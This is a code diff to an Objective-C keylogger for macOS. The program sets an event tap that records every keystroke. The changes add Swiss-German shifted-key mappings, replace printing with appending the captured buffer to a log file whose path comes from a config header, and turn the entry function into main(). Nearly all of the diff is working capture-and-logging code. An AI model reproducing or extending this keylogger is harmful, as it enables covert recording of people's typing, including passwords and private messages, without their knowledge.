@@ -38,16 +38,15 @@
 */
 
 // Imports
+#include "config.h"
 #import <string.h>
 #import <Carbon/Carbon.h>
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
 
-#define bufMax 40000
-
 // Create event tap
 static CFMachPortRef eventTap = NULL;
-static char buf[bufMax] = {0};
+static char buf[BUFSIZE] = {0};
 static int bufIndex = 0;
 
 // Colourful messages
@@ -66,7 +65,7 @@ const static Colours colours = {
 NSString* keyCodeToString(CGEventRef event, CGEventType type);
 NSMutableString* extractKeyModifiers(CGEventRef event);
 CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref);
-void moddump();
+void logma();
 
 /* getKey: Map the keycode to a char
  * @PARAM CGEventRef: event
@@ -182,11 +181,43 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
         // Hanle special keys
         // shift, ctrl, alt, cmd, caps
         if ([keyMods rangeOfString:@"cmd"].location != NSNotFound && [keyCodeToString(event, type) isEqualToString:@"ö"]) {
-            moddump();
+            logma();
         }
         // handle modifiers
         if ([keyMods rangeOfString:@"shift"].location != NSNotFound || [keyMods rangeOfString:@"caps"].location != NSNotFound) {
-            sprintf(buf + bufIndex, "%s", [[keyCodeToString(event, type) uppercaseString] UTF8String]);
+            // special keys for swiss-german keyboard
+            if ([keyCodeToString(event, type) isEqualToString:@"."]) {
+                sprintf(buf + bufIndex, "%s", ":");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"-"]) {
+                sprintf(buf + bufIndex, "%s", "_");
+            } else if ([keyCodeToString(event, type) isEqualToString:@","]) {
+                sprintf(buf + bufIndex, "%s", ";");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"<"]) {
+                sprintf(buf + bufIndex, "%s", ">");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"'"]) {
+                sprintf(buf + bufIndex, "%s", "?");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"2"]) {
+                sprintf(buf + bufIndex, "%s", "\"");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"9"]) {
+                sprintf(buf + bufIndex, "%s", ")");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"8"]) {
+                sprintf(buf + bufIndex, "%s", "(");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"7"]) {
+                sprintf(buf + bufIndex, "%s", "/");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"6"]) {
+                sprintf(buf + bufIndex, "%s", "&");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"5"]) {
+                sprintf(buf + bufIndex, "%s", "%");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"4"]) {
+                sprintf(buf + bufIndex, "%s", "Ç");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"3"]) {
+                sprintf(buf + bufIndex, "%s", "*");
+            } else if ([keyCodeToString(event, type) isEqualToString:@"1"]) {
+                sprintf(buf + bufIndex, "%s", "+");
+            }
+            else {
+                sprintf(buf + bufIndex, "%s", [[keyCodeToString(event, type) uppercaseString] UTF8String]);
+            }
         } else if ([keyMods rangeOfString:@"ctrl"].location != NSNotFound) {
         } else if ([keyMods rangeOfString:@"alt"].location != NSNotFound) {
         } else if ([keyMods rangeOfString:@"cmd"].location != NSNotFound) {
@@ -194,23 +225,32 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
             sprintf(buf + bufIndex, "%s", [keyCodeToString(event, type) UTF8String]);
         }
         bufIndex += strlen(buf + bufIndex);
+        if (strlen(buf)-1 >= bufIndex) {
+            logma();
+        }
     }
     // return
     return event;
 }
 
-/* moddump: dump buffer and exec */
-void moddump() {
-    printf("%s\n", buf);
+/* log: log the buf contents to the logfile */
+void logma() {
+    FILE *fp;
+    fp = fopen(OUT_FILE_PATH, "a+");
+    if (fp == NULL) {
+        fp = fopen(OUT_FILE_PATH, "w+");
+    }
+    fputs(buf, fp);
+    fclose(fp);
     bufIndex = 0;
-    memset(buf, 0, bufMax);
+    memset(buf, 0, BUFSIZE);
 }
 
 /* main: The main function 
  * @PARAM int: argc 
  * @PARAM char**: argv
  * @RVal int */
-void get() {
+int main() {
     // event mask + loop
     CGEventMask eventMask = 0;
     CFRunLoopSourceRef runLoopSource = NULL;
